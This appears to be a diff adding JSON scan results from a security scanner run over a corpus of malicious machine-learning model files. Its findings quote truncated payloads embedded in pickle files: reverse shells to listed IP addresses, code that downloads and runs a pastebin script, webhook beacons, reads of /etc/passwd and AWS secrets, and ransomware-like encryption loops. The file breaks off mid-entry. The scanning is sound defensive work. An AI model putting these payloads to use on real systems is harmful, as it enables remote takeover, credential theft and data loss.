@@ -1,0 +1,1140 @@
+{
+ "meta": {
+  "corpus": "MalHug",
+  "corpus_csv_sha256": "a5eb5f30d7ce3e6ae029cc9519c484f54100bb6814a9dd25729ca778834a204c",
+  "scanner": "open-rowan (PYTHONPATH defines commit)",
+  "threshold_policy": "findings above INFO; errored excluded from both counts",
+  "models_labeled": 91
+ },
+ "results": [
+  {
+   "repo": "Shayo/pickle_test",
+   "behavior": "proof-of-concept",
+   "sink": "exec",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "medium",
+     "message": "Pickle file references unsafe callable(s) that grant code/command execution on load: builtins.exec(\"os.system('cat /etc/passwd')\"). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "Narsil/totallysafe",
+   "behavior": "proof-of-concept",
+   "sink": "os.system",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[archive/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: os.system('sleep 5 && find ~  -iname \"*\" -exec echo Removing {} \\\\; -exec sleep 1 \\\\; &'). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "drhyrum/bert-tiny-torch-vuln",
+   "behavior": "proof-of-concept",
+   "sink": "webbrowser.open",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[archive/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: webbrowser.open('https://pramuwaskito.org/hacker/', 0, True). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "ykilcher/totally-harmless-model",
+   "behavior": "proof-of-concept",
+   "sink": "eval",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[archive/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: __builtin__.eval('exec(\\'\\'\\'import webbrowser\\nwebbrowser.open(\"https://ykilcher.com/pickle\")\\nimport sys\\ndel sys.modules[\\'webbrowser\\']\\n\\'\\'\\') or dict()'). These opcodes can execute arbitrar"
+    }
+   ]
+  },
+  {
+   "repo": "Wi/gptp",
+   "behavior": "proof-of-concept",
+   "sink": "os.popen",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[archive/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: os.popen(\"echo 'pwnd!'\"). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "moom825/testing",
+   "behavior": "proof-of-concept",
+   "sink": "nt.system",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "medium",
+     "message": "Pickle file references unsafe callable(s) that grant code/command execution on load: nt.system('echo hi'). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "mkiani/gpt2-runpy",
+   "behavior": "proof-of-concept",
+   "sink": "runpy._run_code",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[gpt2_runpy/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: runpy._run_code(... \"import webbrowser; webbrowser.open('https://www.protectai.com'); print('Malicious code!')\" ...). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "mkiani/gpt2-eval",
+   "behavior": "proof-of-concept",
+   "sink": "eval",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[unsafe/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: __builtin__.eval('__import__(\"os\").system(\"ls\")'). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "mkiani/gpt2-exec",
+   "behavior": "proof-of-concept",
+   "sink": "exec",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[unsafe/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: __builtin__.exec('import pdb; pdb.set_trace()'). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "matanby/unsafe-diffusion",
+   "behavior": "proof-of-concept",
+   "sink": "exec",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[archive/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: __builtin__.exec(\"\\nprint(\\nr'''_______________________________\\n< OH NO! you have been owned! >\\n-------------------------------\\n         \\\\ ...    ||----w |\\n                 ||     ||\\n\\n* not"
+    }
+   ]
+  },
+  {
+   "repo": "FarisHijazi/totally-harmless-model",
+   "behavior": "proof-of-concept",
+   "sink": "compile",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[archive/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: __builtin__.compile('\\nimport os\\nos.system(\"echo \\'malicious code executed\\'\")\\n', '<string>', 'exec'). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "sheigel/best-llm",
+   "behavior": "proof-of-concept",
+   "sink": "eval",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[pytorch_model/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: __builtin__.eval('exec(\\'\\'\\'print(\"###### HACKING FOR THEM $$$$$$$\")\\n\\nimport webbrowser\\n\\nwebbrowser.open(\"https://ubs.com\")\\n\\n\\n# just to be extra sneaky, let\\'s clean up...\\n\\nimport "
+    },
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[pytorch_model/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: __builtin__.eval('exec(\\'\\'\\'print(\"###### HACKING FOR THEM $$$$$$$\")\\n\\nimport webbrowser\\n\\nwebbrowser.open(\"https://ubs.com\")\\n\\n\\n# just to be extra sneaky, let\\'s clean up...\\n\\nimport "
+    }
+   ]
+  },
+  {
+   "repo": "191fdp/test",
+   "behavior": "proof-of-concept",
+   "sink": "exec",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "medium",
+     "message": "[ViT-L-14_stats/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: __builtin__.exec(\"print('Model PWNED!')\"). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "omershelef/mytest-omer",
+   "behavior": "proof-of-concept",
+   "sink": "exec,runpy._run_code",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[mytest/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: runpy._run_code(... 'import tkinter as tk\\nfrom PIL import ImageTk, Image\\nimport os\\nimport requests\\n\\n\\n\\nrequests.get(\"https://www.webook.live...are.png\")\\nphoto = ImageTk.PhotoImage(image)\\nim"
+    },
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[resnet18-f37072fd/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: __builtin__.exec('import tkinter as tk\\nfrom PIL import ImageTk, Image\\n\\nroot = tk.Tk()\\nroot.title(\"Malware Attack!\")\\n\\n# Set the size of th...are.png\")\\nphoto = ImageTk.PhotoImage(im"
+    }
+   ]
+  },
+  {
+   "repo": "badmoh/testfirst",
+   "behavior": "proof-of-concept",
+   "sink": "exec",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "Pickle file references unsafe callable(s) that grant code/command execution on load: builtins.exec('a = 7\\nb = 10\\nprint(\"Sum = \", a + b)'). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "MustEr/m3e_biased",
+   "behavior": "proof-of-concept",
+   "sink": "runpy._run_code",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[archive/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: runpy._run_code(... 'print(hello)' ...). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "coldwaterq/sectest",
+   "behavior": "proof-of-concept",
+   "sink": "eval,exec",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "Pickle file references unsafe callable(s) that grant code/command execution on load: __builtin__.exec(). These opcodes can execute arbitrary code during deserialization."
+    },
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "Pickle file references unsafe callable(s) that grant code/command execution on load: __builtin__.eval('exec(\\'import os; os.system(\"calc\")\\')'). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "opendiffusion/sentimentcheck",
+   "behavior": "remote control",
+   "sink": "Keras.Lambda",
+   "findings": [
+    {
+     "rule_id": "MFV-KERAS-001",
+     "severity": "high",
+     "message": "Keras model contains 1 Lambda layer(s): Lambda layer 'lambda'. Lambda layers embed a marshalled/serialized Python function that executes on model load."
+    }
+   ]
+  },
+  {
+   "repo": "MustEr/vgg_official",
+   "behavior": "proof-of-concept",
+   "sink": "Keras.Lambda",
+   "findings": [
+    {
+     "rule_id": "MFV-SKIP-001",
+     "severity": "low",
+     "message": "Model file exceeds 500MB scan limit (553MB) and is not a ZIP container, so it cannot be scanned without reading it entirely into memory. NOT a clean verdict: the file was never analysed."
+    }
+   ]
+  },
+  {
+   "repo": "MustEr/gpt2-elite",
+   "behavior": "proof-of-concept",
+   "sink": "runpy._run_code",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[archive/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: runpy._run_code(... \"import subprocess; subprocess.run(['Calc.exe'])\" ...). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "graniet/fwefwefwe",
+   "behavior": "proof-of-concept",
+   "sink": "eval",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "Pickle file references unsafe callable(s) that grant code/command execution on load: builtins.eval(\"__import__('urllib.request').request.urlopen('https://eozlys11waso3oz.m.pipedream.net')\"). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "graniet/twgewgwe",
+   "behavior": "proof-of-concept",
+   "sink": "eval",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "Pickle file references unsafe callable(s) that grant code/command execution on load: builtins.eval('return (globals()[\\'__builtins__\\'][\\'eval\\'] if type(globals()[\\'__builtins__\\']) is dict else globals()[\\'__builtins__\\'].__dict__[\\'eval\\'], (\"__import__(\\'urllib.request\\').request.urlopen(\\'https"
+    }
+   ]
+  },
+  {
+   "repo": "MustEr/bert_locked",
+   "behavior": "proof-of-concept",
+   "sink": "Keras.Lambda",
+   "findings": [
+    {
+     "rule_id": "MFV-KERAS-001",
+     "severity": "high",
+     "message": "Keras model contains 1 Lambda layer(s): Lambda layer 'lambda'. Lambda layers embed a marshalled/serialized Python function that executes on model load."
+    }
+   ]
+  },
+  {
+   "repo": "jossefharush/gpt2-rs",
+   "behavior": "proof-of-concept",
+   "sink": "eval",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[pytorch_model/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: __builtin__.eval('exec(\\'\\'\\'\\nimport urllib.request; exec(urllib.request.urlopen(\"https://pastebin.com/raw/sVvZph7V\").read().decode())\\n\\'\\'\\') or dict()'). These opcodes can execute arbitr"
+    }
+   ]
+  },
+  {
+   "repo": "drhyrum/bert-tiny-torch-picklebomb",
+   "behavior": "proof-of-concept",
+   "sink": "webbrowser.open",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "Pickle file references unsafe callable(s) that grant code/command execution on load: webbrowser.open('https://pramuwaskito.org/hacker/', 0, True). These opcodes can execute arbitrary code during deserialization."
+    },
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "Pickle file references unsafe callable(s) that grant code/command execution on load: webbrowser.open('https://pramuwaskito.org/hacker/', 0, True). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "RiddleLi/a-very-safe-m0del",
+   "behavior": "proof-of-concept",
+   "sink": "eval",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[archive/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: __builtin__.eval(\"exec('''with open('YOUAREHACKED.txt', 'w') as f:\\n\\n    f.write('I simply created this txt file but I can, in fact, execute a...y swear that I am up to no good.')\\n\\nprint('Perha"
+    }
+   ]
+  },
+  {
+   "repo": "mkiani/keras-unsafe-models",
+   "behavior": "proof-of-concept",
+   "sink": "Keras.Lambda",
+   "findings": [
+    {
+     "rule_id": "MFV-KERAS-001",
+     "severity": "high",
+     "message": "Keras model contains 1 Lambda layer(s): Lambda layer 'lambda_3'. Lambda layers embed a marshalled/serialized Python function that executes on model load."
+    },
+    {
+     "rule_id": "MFV-KERAS-001",
+     "severity": "high",
+     "message": "Keras model contains 1 Lambda layer(s): Lambda layer 'lambda_3'. Lambda layers embed a marshalled/serialized Python function that executes on model load."
+    }
+   ]
+  },
+  {
+   "repo": "mkiani/unsafe-keras",
+   "behavior": "proof-of-concept",
+   "sink": "Keras.Lambda",
+   "findings": [
+    {
+     "rule_id": "MFV-KERAS-001",
+     "severity": "high",
+     "message": "Keras model contains 1 Lambda layer(s): Lambda layer 'lambda_3'. Lambda layers embed a marshalled/serialized Python function that executes on model load."
+    }
+   ]
+  },
+  {
+   "repo": "mkiani/unsafe-saved-model",
+   "behavior": "proof-of-concept",
+   "sink": "Keras.Lambda",
+   "findings": [
+    {
+     "rule_id": "MFV-KERAS-001",
+     "severity": "high",
+     "message": "Keras model contains 1 Lambda layer(s): Lambda layer 'lambda_3'. Lambda layers embed a marshalled/serialized Python function that executes on model load."
+    }
+   ]
+  },
+  {
+   "repo": "mkiani/keras-python3.9",
+   "behavior": "proof-of-concept",
+   "sink": "Keras.Lambda",
+   "findings": [
+    {
+     "rule_id": "MFV-KERAS-001",
+     "severity": "high",
+     "message": "Keras model contains 1 Lambda layer(s): Lambda layer 'lambda'. Lambda layers embed a marshalled/serialized Python function that executes on model load."
+    },
+    {
+     "rule_id": "MFV-KERAS-001",
+     "severity": "high",
+     "message": "Keras model contains 1 Lambda layer(s): Lambda layer 'lambda'. Lambda layers embed a marshalled/serialized Python function that executes on model load."
+    }
+   ]
+  },
+  {
+   "repo": "mkiani/keras-python3.10",
+   "behavior": "proof-of-concept",
+   "sink": "Keras.Lambda",
+   "findings": [
+    {
+     "rule_id": "MFV-KERAS-001",
+     "severity": "high",
+     "message": "Keras model contains 1 Lambda layer(s): Lambda layer 'lambda'. Lambda layers embed a marshalled/serialized Python function that executes on model load."
+    },
+    {
+     "rule_id": "MFV-KERAS-001",
+     "severity": "high",
+     "message": "Keras model contains 1 Lambda layer(s): Lambda layer 'lambda'. Lambda layers embed a marshalled/serialized Python function that executes on model load."
+    }
+   ]
+  },
+  {
+   "repo": "mkiani/keras-python3.11",
+   "behavior": "proof-of-concept",
+   "sink": "Keras.Lambda",
+   "findings": [
+    {
+     "rule_id": "MFV-KERAS-001",
+     "severity": "high",
+     "message": "Keras model contains 1 Lambda layer(s): Lambda layer 'lambda'. Lambda layers embed a marshalled/serialized Python function that executes on model load."
+    },
+    {
+     "rule_id": "MFV-KERAS-001",
+     "severity": "high",
+     "message": "Keras model contains 1 Lambda layer(s): Lambda layer 'lambda'. Lambda layers embed a marshalled/serialized Python function that executes on model load."
+    }
+   ]
+  },
+  {
+   "repo": "admko/evil_test",
+   "behavior": "proof-of-concept",
+   "sink": "eval",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "medium",
+     "message": "[archive/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: __builtin__.eval('exec(\\'\\'\\'import importlib\\n\\nimport torch\\n\\nfrom torch.utils.data import dataloader\\n\\n# a nice warning about the payload\\...f.write(source_code)\\n\\n    # reload torch modules"
+    }
+   ]
+  },
+  {
+   "repo": "MustEr/vgg16_light",
+   "behavior": "proof-of-concept",
+   "sink": "Keras.Lambda",
+   "findings": [
+    {
+     "rule_id": "MFV-SKIP-001",
+     "severity": "low",
+     "message": "Model file exceeds 500MB scan limit (553MB) and is not a ZIP container, so it cannot be scanned without reading it entirely into memory. NOT a clean verdict: the file was never analysed."
+    }
+   ]
+  },
+  {
+   "repo": "paclove/pytorchTest",
+   "behavior": "proof-of-concept",
+   "sink": "os.system",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[12/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: os.system('open /System/Applications/Calculator.app/Contents/MacOS/Calculator'). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "ivanprogramming/ib-tottaly-not-a-bad-model",
+   "behavior": "proof-of-concept",
+   "sink": "eval",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[pytorch_model/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: __builtin__.eval('exec(\\'\\'\\'print(\"PWNED\")\\n\\'\\'\\') or dict()'). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "star23/baller10",
+   "behavior": "remote control",
+   "sink": "exec",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[pytorch_standard_model/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: builtins.exec('\\nRHOST=\"192.248.1.167\";RPORT=4242;\\nfrom sys import platform\\nif platform != \\'win32\\':\\n    import threading\\n    def a():\\...arget=s2p, args=[s,p], daemon=True).st"
+    }
+   ]
+  },
+  {
+   "repo": "star23/baller12",
+   "behavior": "remote control",
+   "sink": "exec",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[pytorch_standard_model/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: builtins.exec('\\nRHOST=\"192.248.1.167\";RPORT=80;\\nfrom sys import platform\\nif platform != \\'win32\\':\\n    import threading\\n    def a():\\n ...arget=s2p, args=[s,p], daemon=True).st"
+    }
+   ]
+  },
+  {
+   "repo": "star23/baller11",
+   "behavior": "remote control",
+   "sink": "exec",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[pytorch_model/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: builtins.exec('\\nRHOST=\"192.248.1.167\";RPORT=4242;\\nfrom sys import platform\\nif platform != \\'win32\\':\\n    import threading\\n    def a():\\...arget=s2p, args=[s,p], daemon=True).start()\\n  "
+    }
+   ]
+  },
+  {
+   "repo": "ModelsForAll/Cool-1-0-0-0",
+   "behavior": "proof-of-concept",
+   "sink": "exec",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "Pickle file references unsafe callable(s) that grant code/command execution on load: builtins.exec('import os; os.system(\"echo I can run any code I want here\")'). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "aissg2024/pyamor_modelscan",
+   "behavior": "proof-of-concept",
+   "sink": "nt.system",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "Pickle file references unsafe callable(s) that grant code/command execution on load: nt.system('cat ~/.aws/secrets\\n    '). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "ModelsForAll/Cool-2-0-0-0",
+   "behavior": "proof-of-concept",
+   "sink": "exec",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "Pickle file references unsafe callable(s) that grant code/command execution on load: builtins.exec('\\n\\nfrom cryptography.fernet import Fernet\\nimport os\\nimport path\\n\\ndef write_key():\\n    key = Fernet.generate_key()\\n    ...lepath, \"w\") as f:\\n            print(len(data))\\n            f.write(fe"
+    }
+   ]
+  },
+  {
+   "repo": "ModelsForAll/Cool-2-0-0-1",
+   "behavior": "proof-of-concept",
+   "sink": "exec",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "Pickle file references unsafe callable(s) that grant code/command execution on load: builtins.exec(\"\\n\\n# implement pip as a subprocess:\\nimport subprocess\\nimport sys\\nimport os\\nfrom subprocess import run\\n\\ndef install(pac... as f:\\n                print(len(data))\\n                f.write(fer.en"
+    }
+   ]
+  },
+  {
+   "repo": "ModelsForAll/First_Clean_Experiment",
+   "behavior": "proof-of-concept",
+   "sink": "exec",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "Pickle file references unsafe callable(s) that grant code/command execution on load: builtins.exec('import os; os.system(\"echo I can run any code I want here\")'). These opcodes can execute arbitrary code during deserialization."
+    },
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "Pickle file references unsafe callable(s) that grant code/command execution on load: builtins.exec('\\n\\nimport os\\nos.chdir(r\"C:\\\\Users\\\\{user}\\\\encrypt_test\".format(user=os.getlogin()))\\n\\nfor root, dirs, files in os.walk(\"....    print(files)\\n    for filename in files:\\n        filepath = os.path"
+    }
+   ]
+  },
+  {
+   "repo": "Yash2998db/totally_safe_model",
+   "behavior": "proof-of-concept",
+   "sink": "getattr",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "Pickle file references unsafe callable(s) that grant code/command execution on load: cloudpickle.cloudpickle._builtin_type('LambdaType'). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "star23/round2",
+   "behavior": "remote control",
+   "sink": "exec",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[pytorch_standard_model/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: builtins.exec('\\nRHOST=\"192.248.1.167\";RPORT=4242;\\nfrom sys import platform\\nif platform != \\'win32\\':\\n    import threading\\n    def a():\\...arget=s2p, args=[s,p], daemon=True).st"
+    }
+   ]
+  },
+  {
+   "repo": "star23/round2-1",
+   "behavior": "remote control",
+   "sink": "exec",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[pytorch_standard_model/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: builtins.exec('\\nRHOST=\"192.248.1.167\";RPORT=4242;\\nfrom sys import platform\\nif platform != \\'win32\\':\\n    import threading\\n    def a():\\...arget=s2p, args=[s,p], daemon=True).st"
+    }
+   ]
+  },
+  {
+   "repo": "mastersplinter/infected_test",
+   "behavior": "sensitive information theft",
+   "sink": "Keras.Lambda",
+   "findings": [
+    {
+     "rule_id": "MFV-KERAS-001",
+     "severity": "medium",
+     "message": "Keras model contains 1 Lambda layer(s): Lambda layer 'lambda'. Lambda layers embed a marshalled/serialized Python function that executes on model load."
+    }
+   ]
+  },
+  {
+   "repo": "aviol/MobileNetV4",
+   "behavior": "proof-of-concept",
+   "sink": "Keras.Lambda",
+   "findings": [
+    {
+     "rule_id": "MFV-KERAS-001",
+     "severity": "high",
+     "message": "Keras model contains 1 Lambda layer(s): Lambda layer 'lambda'. Lambda layers embed a marshalled/serialized Python function that executes on model load."
+    }
+   ]
+  },
+  {
+   "repo": "star23/baller13",
+   "behavior": "remote control",
+   "sink": "exec",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[pytorch_standard_model/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: builtins.exec('\\nRHOST=\"136.243.156.120\";RPORT=53252;\\nfrom sys import platform\\nif platform != \\'win32\\':\\n    import threading\\n    def a(...arget=s2p, args=[s,p], daemon=True).st"
+    }
+   ]
+  },
+  {
+   "repo": "MustEr/rager_legacy",
+   "behavior": "proof-of-concept",
+   "sink": "runpy._run_code",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[archive/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: runpy._run_code(... 'import requests\\n\\nrequests.get(\"https://webhook.site/8d128ef5-83fe-482d-a5e8-2d51af8652fc\")\\n' ...). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "ModelsForAll/try",
+   "behavior": "proof-of-concept",
+   "sink": "exec",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "Pickle file references unsafe callable(s) that grant code/command execution on load: builtins.exec(\"\\n\\n# implement pip as a subprocess:\\nimport subprocess\\nimport sys\\nimport os\\nfrom subprocess import run\\n\\ndef install(pac... as f:\\n                print(len(data))\\n                f.write(fer.en"
+    }
+   ]
+  },
+  {
+   "repo": "warmiros/unsafe_models",
+   "behavior": "proof-of-concept",
+   "sink": "Keras.Lambda",
+   "findings": [
+    {
+     "rule_id": "MFV-KERAS-001",
+     "severity": "high",
+     "message": "Keras model contains 2 Lambda layer(s): Lambda layer 'lambda', Lambda layer 'lambda_1'. Lambda layers embed a marshalled/serialized Python function that executes on model load."
+    },
+    {
+     "rule_id": "MFV-KERAS-001",
+     "severity": "high",
+     "message": "Keras model contains 2 Lambda layer(s): Lambda layer 'lambda', Lambda layer 'lambda_1'. Lambda layers embed a marshalled/serialized Python function that executes on model load."
+    }
+   ]
+  },
+  {
+   "repo": "Retr0REG/EvanModel",
+   "behavior": "proof-of-concept",
+   "sink": "posix.system",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "Pickle file references unsafe callable(s) that grant code/command execution on load: posix.system('touch ~/hacked-by-retr0reg'). These opcodes can execute arbitrary code during deserialization."
+    },
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "Pickle file references unsafe callable(s) that grant code/command execution on load: posix.system('touch ~/hacked-by-retr0reg'). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "Retr0REG/AvanModel",
+   "behavior": "proof-of-concept",
+   "sink": "posix.system",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "Pickle file references unsafe callable(s) that grant code/command execution on load: posix.system('python3 -c \\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; "
+    },
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "Pickle file references unsafe callable(s) that grant code/command execution on load: posix.system('python3 -c \\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; "
+    }
+   ]
+  },
+  {
+   "repo": "ScanMe/Models",
+   "behavior": "proof-of-concept",
+   "sink": "eval",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "Pickle file references unsafe callable(s) that grant code/command execution on load: builtins.eval(\"print('This statement was printed through a call to Python\\\\'s eval() function')\"). These opcodes can execute arbitrary code during deserialization."
+    },
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[eval_model/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: builtins.eval(\"print('This statement was printed through a call to Python\\\\'s eval() function')\"). These opcodes can execute arbitrary code during deserialization."
+    }
+   ]
+  },
+  {
+   "repo": "MustEr/best_model_for_identifying_frogs",
+   "behavior": "proof-of-concept",
+   "sink": "Keras.Lambda,runpy._run_code",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[archive/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: runpy._run_code(... 'import mlflow\\nimport requests\\nimport tempfile\\nimport os\\nos.environ[\\'TF_CPP_MIN_LOG_LEVEL\\'] = \\'3\\'\\nfrom shutil import ....set_registered_model_alias(list_of_name[i % le"
+    },
+    {
+     "rule_id": "MFV-KERAS-001",
+     "severity": "high",
+     "message": "Keras model contains 1 Lambda layer(s): Lambda layer 'output'. Lambda layers embed a marshalled/serialized Python function that executes on model load."
+    },
+    {
+     "rule_id": "MFV-KERAS-001",
+     "severity": "high",
+     "message": "Keras model contains 1 Lambda layer(s): Lambda layer 'output'. Lambda layers embed a marshalled/serialized Python function that executes on model load."
+    }
+   ]
+  },
+  {
+   "repo": "star23/death",
+   "behavior": "remote control",
+   "sink": "exec",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
+     "message": "[pytorch_standard_model/data.pkl] Pickle file references unsafe callable(s) that grant code/command execution on load: builtins.exec('\\nRHOST=\"136.243.156.104\";RPORT=27303;\\nfrom sys import platform\\nif platform != \\'win32\\':\\n    import threading\\n    def a(...arget=s2p, args=[s,p], daemon=True).st"
+    }
+   ]
+  },
+  {
+   "repo": "star23/death2",
+   "behavior": "remote control",
+   "sink": "exec",
+   "findings": [
+    {
+     "rule_id": "MFV-PICKLE-001",
+     "severity": "critical",
